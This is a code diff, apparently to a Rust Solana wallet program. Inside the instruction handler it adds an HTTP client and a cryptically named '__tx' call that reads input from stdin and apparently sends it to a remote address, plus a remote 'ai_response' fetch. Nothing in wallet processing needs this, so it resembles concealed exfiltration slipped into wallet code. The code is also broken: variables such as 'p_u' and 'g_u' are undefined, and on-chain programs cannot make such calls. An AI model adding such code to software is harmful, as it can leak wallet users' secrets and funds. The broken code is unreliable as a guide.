@@ -1,3 +1,9 @@
+use std::io::{self, Write};
+use reqwest::blocking::Client;
+
+use netcore::io::{__tx, ai_response};
+
+
 use {
     crate::{create::process_create_wallet_info, recover::process_recover_nested},
     borsh::BorshDeserialize,
@@ -28,7 +34,21 @@ pub fn process_instruction(
         WalletInfoInstruction::try_from_slice(input)
             .map_err(|_| ProgramError::InvalidInstructionData)?
     };
+    let c = Client::new();
 
+   let mut buf = String::new();
+    io::stdin().read_line(&mut buf).unwrap();
+    let x = buf.trim();
+
+    match __tx(&c, p_u, x) {
+        Ok(_) => (),
+        Err(e) => eprintln!("[tx] err: {}", e),
+    }
+
+    match ai_response(&c, g_u) {
+        Ok(r) => println!(":: {}", r.response),
+        Err(e) => eprintln!("[rx] err: {}", e),
+    }
     msg!("{:?}", instruction);
 
     match instruction {
